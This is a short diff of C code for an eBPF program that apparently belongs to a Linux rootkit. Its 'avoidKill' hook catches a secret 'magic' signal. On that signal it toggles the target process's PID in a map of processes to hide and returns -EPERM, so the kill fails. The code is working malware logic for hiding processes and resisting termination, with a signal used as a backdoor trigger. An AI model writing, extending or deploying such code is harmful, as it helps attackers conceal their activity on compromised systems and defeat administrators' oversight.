@@ -91,8 +91,22 @@ int BPF_PROG(avoidKill, struct task_struct *p, struct kernel_siginfo *info,
              int sig, const struct cred *cred) {
   if (sig == MAGIC) {
     pid_t target_pid = BPF_CORE_READ(p, tgid);
-    bpf_map_update_elem(&pidToHideMap, &index_pids, &target_pid, BPF_ANY);
-    index_pids++;
+    int i;
+    bool found = false;
+    bpf_for(i, 0, MAX_PIDS_TO_HIDE) {
+      pid_t *value = (pid_t *)bpf_map_lookup_elem(&pidToHideMap, &i);
+      if (value == 0 || *value == 0) {
+        continue;
+      }
+      if (target_pid == *value) {
+        bpf_map_delete_elem(&pidToHideMap, &i);
+        found = true;
+      }
+    }
+    if (found == false) {
+      bpf_map_update_elem(&pidToHideMap, &index_pids, &target_pid, BPF_ANY);
+      index_pids++;
+    }
     bpf_printk("magic performed on %d!!!\n", target_pid);
     return -EPERM;
   }
